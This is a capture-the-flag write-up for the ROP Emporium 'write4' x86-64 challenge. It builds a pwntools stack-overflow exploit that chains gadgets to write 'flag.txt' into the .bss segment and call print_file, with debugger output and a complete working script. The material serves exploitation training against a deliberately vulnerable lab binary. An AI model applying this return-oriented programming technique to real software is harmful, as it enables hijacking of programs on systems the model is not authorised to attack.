---
title: "ROP Emporium x86-64 Challenge 4: write4"
date: "2025-12-27"
description: "Writeup for the write4 challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 4: write4

#### December 27, 2025

For this challenge, we'll have to call a function called `print_file` that lies somewhere in the binary. This function will print the content of the file it receives as an argument, in the form of a path. However, we are told that there are no special strings we can use to call `print_file`, which means that we'll have to create it ourselves and store it in memory, hence the name of the challenge.

## Looking for tools

To start, let's perform the routine we've done for the other challenges:

```
pwndbg> info functions
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
```

We still have our usual `usefulFunction` and `usefulGadgets` functions, along with `print_file`.

```
pwndbg> disas usefulFunction
   0x0000000000400617 <+0>:	    push   rbp
   0x0000000000400618 <+1>:	    mov    rbp,rsp
   0x000000000040061b <+4>:	    mov    edi,0x4006b4
   0x0000000000400620 <+9>:	    call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:	nop
   0x0000000000400626 <+15>:	pop    rbp
   0x0000000000400627 <+16>:	ret
```

Disassembling `usefulFunction` makes us see how we need to call `print_file`. The register `edi` should contain the pointer to the string with the path to the file we want to open. However, the pointer that function uses doesn't have a valid path:

```
pwndbg> x/s 0x4006b4
0x4006b4:	"nonexistent"
```

Our goal is to write in memory the string `flag.txt`, and store its pointer in `edi` right before we call `print_file`. In order to do this, we'll have to use gadgets, just like in the other challenges. Let's see what we're given in `usefulGadgets`:

```
pwndbg> disas usefulGadgets
   0x0000000000400628 <+0>:	mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:	ret
   0x000000000040062c <+4>:	nop    DWORD PTR [rax+0x0]
```

For now on, if you're given a gadget with which you can write to memory, smile. That's the case in this challenge. `mov [r14], r15` will store whatever value is in `r15` in the memory address stored in `r14`, like this:

```
r14 = 0xAEAE
r15 = 0xCAFE

BEFORE THE MOV INSTRUCTION:
0xAEAE: 0xBEEF

AFTER THE MOV INSTRUCTION:
0xAEAE: 0xCAFE
```

All we need is to find a `pop` gadget that allows us to write in `r14` and `r15`. Let's hunt for gadgets with the `rop` command:

```
pwndbg> rop
...
0x0040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x00400690 : pop r14 ; pop r15 ; ret
0x00400692 : pop r15 ; ret
0x00400604 : pop rbp ; jmp 0x400590
0x0040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
0x0040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x00400588 : pop rbp ; ret
0x00400693 : pop rdi ; ret
...
```

Awesome! In `0x00400690`, there's indeed a gadget that will pop two values in the stack and store them in `r14` and `r15`. Ultimately, we have more than enough resources to write arbitrary values in memory.

## Choosing a write address

We're almost ready to go. However, a very valid question to ask right now is in what address should we write in. A random one will not work most likely, because some areas are read-only.

An area that we'll always have access to write to is the `.bss` segment of the binary. In ELF binaries, the `.bss`  segment is used to store variables that have been declared but not initialized yet. This area is writeable, and we can use it to write `flag.txt` in memory.

To know where is this area allocated, we can use the `info files` command. This command will print out all the memory segments of the binary and its address ranges:

```
pwndbg> info files
0x0000000000400238 - 0x0000000000400254 is .interp
0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag
0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id
0x0000000000400298 - 0x00000000004002d0 is .gnu.hash
0x00000000004002d0 - 0x00000000004003c0 is .dynsym
0x00000000004003c0 - 0x000000000040043c is .dynstr
0x000000000040043c - 0x0000000000400450 is .gnu.version
0x0000000000400450 - 0x0000000000400470 is .gnu.version_r
0x0000000000400470 - 0x00000000004004a0 is .rela.dyn
0x00000000004004a0 - 0x00000000004004d0 is .rela.plt
0x00000000004004d0 - 0x00000000004004e7 is .init
0x00000000004004f0 - 0x0000000000400520 is .plt
0x0000000000400520 - 0x00000000004006a2 is .text
0x00000000004006a4 - 0x00000000004006ad is .fini
0x00000000004006b0 - 0x00000000004006c0 is .rodata
0x00000000004006c0 - 0x0000000000400704 is .eh_frame_hdr
0x0000000000400708 - 0x0000000000400828 is .eh_frame
0x0000000000600df0 - 0x0000000000600df8 is .init_array
0x0000000000600df8 - 0x0000000000600e00 is .fini_array
0x0000000000600e00 - 0x0000000000600ff0 is .dynamic
0x0000000000600ff0 - 0x0000000000601000 is .got
0x0000000000601000 - 0x0000000000601028 is .got.plt
0x0000000000601028 - 0x0000000000601038 is .data
0x0000000000601038 - 0x0000000000601040 is .bss
```

The last one is `.bss`, as you can see. Let's note down its address.

Now we're actually ready to go, let's build our payload!

## The payload
Just like in the other challenges, we'll build a Python script with the help of pwntools. Let's start with the variables:

```
from pwn import *

OFFSET = 40

RET_INSTRUCTION_ADDRESS = 0x004004e6
MOV_R15_TO_R14_GADGET_ADDRESS = 0x00400628
POP_R14_POP_R15_GADGET_ADDRESS = 0x00400690
POP_RDI_GADGET_ADDRESS = 0x00400693

PRINT_FILE_FUNCTION_ADDRESS = 0x0000400510
BSS_ADDRESS = 0x00601038
```

The offset was obtained just like in the other challenges. I've gotten the gadget addresses from our disassemble commands earlier and the `rop` command. I've added a `pop rdi; ret` gadget I've found too, which we'll need to write into `rdi` the address to `flag.txt` I've also stored the address to the `print_file` function and our `.bss` starting point address. Let's start with the payload:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
```

As always, first we add in the garbage characters that allow us to reach the return address offset. Then, we align the stack with a `ret` gadget, just to be safe.

Now, we need to write into memory. For that we've found the `mov [r14], r15` gadget, but first we need to populate the `r14` and `r15` registers with the `.bss` address and the `flag.txt` text. We can do that with the other important gadget we've found, the `pop r14; pop r15; ret` gadget:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += b"flag.txt"
```

This will do. Now that the registers contain the appropriate values, we can actually execute the `mov` gadget.

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += b"flag.txt"
payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
```

By this point, we will have already written `flag.txt` into the `.bss` segment. We're pretty much done! All we need to do now is pop into the `rdi` register the address to `.bss`. This register will be used as the pointer to the string `print_file` will use as an argument to print the flag, so after that we can just call `print_file`:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += b"flag.txt"
payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
```

That should do! Now we just need to write the payload into a file and use it as input for the binary. Here's the full script:

```
from pwn import *

OFFSET = 40

RET_INSTRUCTION_ADDRESS = 0x004004e6
MOV_R15_TO_R14_GADGET_ADDRESS = 0x00400628
POP_R14_POP_R15_GADGET_ADDRESS = 0x00400690
POP_RDI_GADGET_ADDRESS = 0x00400693

PRINT_FILE_FUNCTION_ADDRESS = 0x0000400510
BSS_ADDRESS = 0x00601038

payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += b"flag.txt"
payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)

open("exploit", "bw").write(payload)
```

Now, to make it run:

```
$ python3 exploit.py
$ ./write4 < exploit
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```

Done!